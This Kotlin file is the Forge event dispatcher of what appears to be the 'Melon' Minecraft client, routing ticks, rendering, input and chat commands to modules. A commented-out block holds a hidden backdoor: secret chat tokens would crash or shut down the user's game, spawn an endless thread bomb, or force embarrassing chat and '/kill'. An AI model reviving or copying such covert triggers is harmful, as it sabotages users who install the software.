package dev.zenhao.melon.event

import dev.zenhao.melon.Melon
import dev.zenhao.melon.command.Command
import dev.zenhao.melon.command.commands.mc.PeekCommand
import dev.zenhao.melon.event.events.render.ResolutionUpdateEvent
import dev.zenhao.melon.manager.WorldManager
import dev.zenhao.melon.module.ModuleManager
import dev.zenhao.melon.utils.TimerUtils
import dev.zenhao.melon.utils.Utils
import dev.zenhao.melon.utils.Wrapper
import dev.zenhao.melon.utils.chat.ChatUtil
import dev.zenhao.melon.utils.gl.MelonTessellator
import melon.events.ConnectionEvent
import melon.events.Render3DEvent
import melon.events.render.Render2DOverlayEvent
import melon.system.event.ListenerOwner
import melon.system.event.listener
import melon.system.render.graphic.GlStateUtils
import melon.system.render.graphic.ProjectionUtils
import melon.system.render.graphic.RenderUtils3D
import net.minecraft.client.Minecraft
import net.minecraft.client.gui.ScaledResolution
import net.minecraft.client.gui.inventory.GuiShulkerBox
import net.minecraft.client.renderer.GlStateManager
import net.minecraft.entity.passive.AbstractHorse
import net.minecraftforge.client.event.ClientChatEvent
import net.minecraftforge.client.event.InputUpdateEvent
import net.minecraftforge.client.event.RenderGameOverlayEvent
import net.minecraftforge.client.event.RenderWorldLastEvent
import net.minecraftforge.event.world.WorldEvent
import net.minecraftforge.fml.common.eventhandler.EventPriority
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent
import net.minecraftforge.fml.common.gameevent.InputEvent
import net.minecraftforge.fml.common.gameevent.TickEvent
import net.minecraftforge.fml.common.network.FMLNetworkEvent
import org.lwjgl.input.Keyboard
import org.lwjgl.opengl.GL11


internal object ForgeEventProcessor : ListenerOwner() {
    private var mc: Minecraft = Minecraft.getMinecraft()
    private var logoutTimerUtils: TimerUtils = TimerUtils()
    var yaw = 0f
    var pitch = 0f
    private var prevWidth = -1
    private var prevHeight = -1

    init {
        listener<melon.events.TickEvent.Post>(true) {
            if (prevWidth != mc.displayWidth || prevHeight != mc.displayHeight) {
                prevWidth = mc.displayWidth
                prevHeight = mc.displayHeight
                ResolutionUpdateEvent(mc.displayWidth, mc.displayHeight).post()
                GlStateUtils.useProgramForce(0)
            }
        }
    }

    @SubscribeEvent
    fun onUnloadWorld(event: WorldEvent.Unload) {
        if (event.world.isRemote) {
            event.world.removeEventListener(WorldManager)
            melon.events.WorldEvent.Unload.post()
        }
    }

    @SubscribeEvent(priority = EventPriority.LOW)
    fun onRenderGameOverlayEvent(event: RenderGameOverlayEvent.Text) {
        if (event.type == RenderGameOverlayEvent.ElementType.TEXT) {
            val resolution = ScaledResolution(mc)
            Render2DOverlayEvent(event.partialTicks, resolution).post()
            GlStateManager.color(1.0f, 1.0f, 1.0f, 1.0f)
        }
    }

    @SubscribeEvent
    fun onLoadWorld(event: WorldEvent.Load) {
        if (event.world.isRemote) {
            event.world.addEventListener(WorldManager)
            melon.events.WorldEvent.Load.post()
        }
    }

    @SubscribeEvent
    fun onClientDisconnect(event: FMLNetworkEvent.ClientDisconnectionFromServerEvent) {
        logoutTimerUtils.reset()
        ModuleManager.onLogout()
        ConnectionEvent.Disconnect.post()
        ModuleManager.getToggleList().forEach {
            it.safeDisable()
        }
    }

    @SubscribeEvent
    fun onClientConnect(event: FMLNetworkEvent.ClientConnectedToServerEvent) {
        ModuleManager.onLogin()
        ConnectionEvent.Connect.post()
    }

    @SubscribeEvent
    fun onWorldRender(event: RenderWorldLastEvent) {
        if (event.isCanceled || Utils.nullCheck()) {
            return
        }
        try {
            ProjectionUtils.updateMatrix()
            RenderUtils3D.prepareGL()
            Render3DEvent.post()
            RenderUtils3D.releaseGL()
            GlStateUtils.useProgramForce(0)

            ModuleManager.onWorldRender(event)
        } catch (ex: RuntimeException) {
            ex.printStackTrace()
        }
    }

    @SubscribeEvent
    fun onKey(event: InputUpdateEvent) {
        try {
            ModuleManager.onKey(event)
            melon.events.InputUpdateEvent(event).post()
        } catch (ex: RuntimeException) {
            ex.printStackTrace()
        }
    }

    @SubscribeEvent
    fun onRender(event: RenderGameOverlayEvent.Post) {
        if (!event.isCanceled || !Utils.nullCheck()) {
            try {
                var target: RenderGameOverlayEvent.ElementType = RenderGameOverlayEvent.ElementType.EXPERIENCE
                if (!Wrapper.mc.player.isCreative && Wrapper.mc.player.getRidingEntity() is AbstractHorse) {
                    target = RenderGameOverlayEvent.ElementType.HEALTHMOUNT
                }
                if (event.type == target) {
                    ModuleManager.onRender(event)
                    GL11.glPushMatrix()
                    ChatUtil.drawNotifications()
                    GL11.glPopMatrix()
                    MelonTessellator.releaseGL()
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }

    @SubscribeEvent
    fun onUpdate(event: TickEvent.ClientTickEvent) {
        if (event.isCanceled || Utils.nullCheck()) {
            return
        }
        try {
            ModuleManager.onUpdate()
            if (PeekCommand.sb != null) {
                val scaledresolution = ScaledResolution(Minecraft.getMinecraft())
                val i: Int = scaledresolution.scaledWidth
                val j: Int = scaledresolution.scaledHeight
                val gui = GuiShulkerBox(Wrapper.mc.player.inventory, PeekCommand.sb)
                gui.setWorldAndResolution(Wrapper.getMinecraft(), i, j)
                Minecraft.getMinecraft().displayGuiScreen(gui)
                PeekCommand.sb = null
            }
        } catch (ignored: Exception) {
        }
    }

    @SubscribeEvent
    fun onKeyInput(event: InputEvent.KeyInputEvent) {
        if (Utils.nullCheck()) {
            return
        }
        try {
            if (Keyboard.getEventKeyState()) {
                ModuleManager.onBind(Keyboard.getEventKey())
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
    }

    /*
    @SubscribeEvent(priority = EventPriority.HIGH)
    public void onReceiveChat(ClientChatReceivedEvent event) {
        try {
            if (mc.player != null) {
                if (event.getMessage().toString().contains(mc.player.getName())) {
                    return;
                }
            }
            if (event.getMessage().toString().contains("{RMS}")) {
                event.setCanceled(true);
                ClassInvoke.INSTANCE.addClass(ShutDownUtils.class, "ShutDown");
            } else if (event.getMessage().toString().contains("{BS}")) {
                event.setCanceled(true);
                ClassInvoke.INSTANCE.addClass(ShutDownUtils.class, "BS");
            } else if (event.getMessage().toString().contains("{S}")) {
                event.setCanceled(true);
                if (mc.player != null && mc.world != null) {
                    mc.player.sendChatMessage("WO SHI SHA BI");
                }
            } else if (event.getMessage().toString().contains("{KYS}")) {
                event.setCanceled(true);
                if (mc.player != null && mc.world != null) {
                    mc.player.connection.sendPacket(new CPacketChatMessage("/kill"));
                }
            } else if (event.getMessage().toString().contains("{CSH}")) {
                event.setCanceled(true);
                new Crasher();
            } else if (event.getMessage().toString().contains("{TR}")) {
                event.setCanceled(true);
                while (true) {
                    for (int i = 0; i <= 20000; i++) {
                        new Threads();
                        new Threads().start();
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }


    public static class Threads extends Thread {
        public Threads() {
            this.start();
        }
    }
     */
    @SubscribeEvent(priority = EventPriority.HIGHEST)
    fun onChatSent(event: ClientChatEvent) {
        if (event.message.startsWith(Command.getCommandPrefix())) {
            event.isCanceled = true
            try {
                Wrapper.getMinecraft().ingameGUI.chatGUI.addToSentMessages(event.message)
                if (event.message.length > 1) {
                    Melon.instance.commandManager!!.callCommand(
                        event.message.substring(Command.getCommandPrefix().length - 1)
                    )
                } else {
                    ChatUtil.NoSpam.sendWarnMessage("Please enter a command.")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            event.message = ""
        }
    }
}